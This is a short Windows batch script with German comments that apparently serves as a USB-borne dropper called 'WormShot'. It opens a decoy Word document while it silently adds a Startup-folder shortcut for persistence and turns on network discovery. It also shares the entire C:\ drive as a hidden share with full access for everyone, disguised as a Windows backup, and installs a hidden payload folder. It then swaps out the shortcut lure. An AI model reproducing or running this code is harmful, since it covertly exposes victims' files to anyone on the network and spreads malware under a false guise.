@echo off

cd /d "%~dp0"

REM Da sich Programm am Ende selbst löscht zum sichern
if /i "%cd%"=="C:\users\%username%\Wormshot\sys\install_tools\tarninstall\word" exit

REM WordAufruf -- Immer Anpassen
start "winword.exe" "EigentlichesDokument.docx"

REM Auf USB-Stick eingliedern, da Dokument nicht in gleichem Ordner aber auch erste Ebene
cd "WormShot\" || exit

REM Autostart
copy "start.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" || echo ERROR ###: AutoStart-Eintrag nicht gespeichert&&timeout 8 >nul&&exit

REM Aktiviere Netzwerkerkennung
netsh advfirewall firewall set rule group="Netzwerkerkennung" new enable=Yes

REM Gebe User Ordner für Netzwerk frei -- UNSICHTBAR
net share WindowsRecovery$=C:\ /GRANT:Jeder,FULL /UNLIMITED /REMARK:"Windows Sicherung - Daten werden verschluesselt im Netzwerk gesichert." /CACHE:no
REM Setze WScript als Standard-Output, damit kein Konsolenfenster erscheint
cscript //h:wscript //s

REM WormShot installieren
md "C:\users\%username%\WormShot"
attrib +H "C:\users\%username%\WormShot"
cd..&cd..
xcopy "Wormshot\*.*" "C:\users\%username%\WormShot\" /Y /K /H /Q /E /I 

REM Dateien austauschen
del "*.docx.lnk"
attrib -H "*.docx"

exit